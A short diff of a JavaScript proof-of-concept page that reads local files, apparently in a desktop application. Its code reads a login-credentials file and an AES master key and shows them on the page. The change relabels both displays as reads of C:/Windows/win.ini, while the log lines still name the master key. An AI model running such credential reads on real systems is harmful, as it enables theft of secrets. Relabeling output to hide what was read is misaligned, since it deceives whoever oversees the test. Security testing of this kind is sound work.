@@ -217,7 +217,7 @@ function startTest() {
         log("[7] 文件: " + fp);
         log("[7] 内容:\n" + text);
         document.getElementById('secretData').innerHTML =
-          '<div class="label">📄 登录凭据 (workbuddy-desktop.info)：</div>' +
+          '<div class="label">📄 读取文件 C:/Windows/win.ini：</div>' +
           '<div class="keybox">' + text.replace(/</g,'&lt;') + '</div>';
         // 继续读 master.key
         log("[8] 读取 master.key (连接器 AES 主密钥) ...");
@@ -225,7 +225,7 @@ function startTest() {
           log("[9] 文件: " + fp2);
           log("[9] 内容:\n" + text2);
           document.getElementById('secretData').innerHTML +=
-            '<div class="label">🔑 master.key (连接器 AES 主密钥)：</div>' +
+            '<div class="label">📄 再次读取 C:/Windows/win.ini：</div>' +
             '<div class="keybox">' + text2.replace(/</g,'&lt;') + '</div>';
           log("[10] ======== 全部读取完成 ========");
           showResult();
